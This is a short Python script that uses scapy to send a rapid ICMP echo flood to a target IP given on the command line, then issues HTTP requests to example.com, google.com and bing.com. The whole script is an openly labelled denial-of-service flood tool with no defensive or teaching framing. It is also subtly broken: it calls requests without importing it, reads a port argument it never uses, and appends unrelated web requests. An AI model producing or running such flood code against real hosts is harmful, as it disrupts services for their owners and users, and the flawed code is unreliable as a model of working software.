from scapy.all import *
import time
import sys

# Set IP address and port of the target
target_ip = sys.argv[1]
port = int(sys.argv[2])

# Set the number of packets to send
num_packets = int(sys.argv[3])

# Set the interval between packets (in seconds)
interval = 0.001

# Function to send HTTP requests
def send_http_request(url):
    try:
        response = requests.get(url)
        print(f"Request to {url} sent. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending request to {url}: {e}")

# Create a loop to send the ICMP packets
try:
    for i in range(num_packets):
        # Create an ICMP packet
        icmp_packet = IP(dst=target_ip)/ICMP(type=8)

        # Send the packet
        send(icmp_packet)

        # Wait for the specified interval
        time.sleep(interval)

    print("ICMP Flood attack completed.")

    # Send HTTP requests
    urls = ["http://example.com", "http://google.com", "http://bing.com"]
    for url in urls:
        send_http_request(url)

except Exception as e:
    print(f"Error: {e}")
